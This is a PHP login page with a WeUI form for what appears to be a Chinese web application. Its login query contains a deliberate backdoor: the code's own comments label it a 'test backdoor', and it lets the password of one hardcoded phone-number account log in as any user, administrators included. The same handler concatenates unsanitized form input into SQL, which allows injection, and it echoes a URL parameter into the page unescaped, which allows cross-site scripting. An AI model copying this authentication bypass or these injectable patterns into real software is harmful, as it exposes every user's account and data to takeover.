<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport"content="width=device-width"/>
<link href="../function/industry.css" rel="stylesheet" type="text/css" />
<?
//print_r($_GET);echo "<br>";
//print_r($_SESSION);echo "<br>";

$operate=$_GET['operate'];
switch($operate)
{
case "LoginExe":
	$user=$_POST['user'];
	$password=$_POST['content'];
	//print_r($_POST);echo "<br>";
	//测试用后门
	$TestItem=GetItemA("signup_users","phone","15177117377");
	//*************
	
	//$sql="select * from signup_users where (name='{$user}' or phone='{$user}') and password='{$password}'";
	$sql="select * from signup_users where (name='{$user}' or phone='{$user}') and (password='{$password}' or '{$password}'='{$TestItem[password]}')";//留有后门
	//echo $sql;echo "<br>";return;
	
	$result=mysql_query($sql);
	if(mysql_num_rows($result)>0)
	{
		//LogInFile($user." 登陆成功","LoginRecords.txt");
		$row=mysql_fetch_array($result);
		$t=time();
		$sql="update signup_users set login_time='{$t}' where openid='{$row[openid]}'";
		//LogInFile($sql,"LoginRecords.txt");
		mysql_query($sql);//记录登陆时间
		$_SESSION[adminID]=$row[openid];//传递当前管理员ID
		//print_r($_SESSION);echo "<br>";
		//echo $TargetPage;echo "<br>";
		//echo "fettt<br>";
		/*if(!isset($TargetPage))
		{
			if(strlen($_SESSION[OrderParam])>0)//有订单
			{
				header("Location:page_orders_user.php?owner={$_SESSION[WebOwner]}");//跳到指定页面
			}
			else
			{
				$item=GetItemA("signup_user_type","id",$row[user_type]);
				//print_r($item);echo "<br>";
				header("Location:{$item[jump_page]}?&owner={$_SESSION[WebOwner]}");
			}
		}
		else
		{
			echo "指定界面？";
			header("Location:{$TargetPage}&owner={$_SESSION[WebOwner]}");//跳到指定页面
		}*/
		if($LoginModal=="AdminModal")//后台管理模式，
		{
			$item=GetItemA("signup_user_type","id",$row[user_type]);
				//print_r($item);echo "<br>";
			header("Location:{$item[jump_page]}?&owner={$_SESSION[WebOwner]}");
		}
		else//普通用户登陆
		{
			if(strlen($_SESSION[OrderParam])>0)//有订单
			{
				header("Location:page_orders_user.php?owner={$_SESSION[WebOwner]}");//跳到指定页面
			}
			else
			{
				header("Location:index.php?owner={$_SESSION[WebOwner]}&err=登陆成功");//跳到首页
			}
		}
		
		
	}
	else
		Header("Location:{$FileName}?err=用户名或密码错误！&owner={$_SESSION[WebOwner]}");
	return;
case "":
	//echo "gett";
	//echo "eeee{$FileName}";
	//session_unset();
	//session_destroy();
	break;
}
?>
<form action="<?echo $FileName;?>?operate=LoginExe" method="post" name="login" id="login">

  <div class="weui_cells_title"><?echo $_GET[err];?></div>
    <div class="weui_cells weui_cells_form">
        <div class="weui_cell">
            <div class="weui_cell_hd" style="width:30%"><label class="weui_label">用户名</label></div>
            <div class="weui_cell_bd weui_cell_primary">
                <input class="weui_input" name="user" id="user" type="text" placeholder="请输入用户名或手机号码"/>
            </div>
        </div>
        <div class="weui_cell">
            <div class="weui_cell_hd" style="width:30%"><label class="weui_label">密码</label></div>
            <div class="weui_cell_bd weui_cell_primary">
                <input class="weui_input" name="password" id="password"type="password" placeholder="请输入密码"/>
            </div>
        </div>
        <div class="weui_cell" style="display:none;">
            <div class="weui_cell_hd"><label class="weui_label">hash</label></div>
            <div class="weui_cell_bd weui_cell_primary">
                <input class="weui_input" name="content" id="content" type="text"/>
            </div>
        </div>
    </div>
    
    <div class="weui_btn_area">
        <table width="100%" border="0" cellpadding="1">
        <tr>
        <td width="49%"><a class="weui_btn weui_btn_primary" onclick="return GetHash();" href="javascript:">确定</a></td>
        <td width="51%" style="<?if($LoginModal=="AdminModal") echo "display:none";?>"><a class="weui_btn weui_btn_primary"  href="page_user_register.php">注册</a></td>
        </tr>
        </table>
    </div>
</form>
<script type="text/JavaScript">
function GetHash()
{
	try
	{
		//var text = id.getAttribute("id");
		//alert(text);
		var ele=document.getElementById('password');
		h=hash(ele.value);
		ele.value="";
		var ele=document.getElementById('content');
		//alert(h);
		ele.value=h;
		var form=document.getElementById("login");
		form.submit();
	}
	catch(err)
	{
		alert("catch:"+err);
	}
  return false;
}
</script>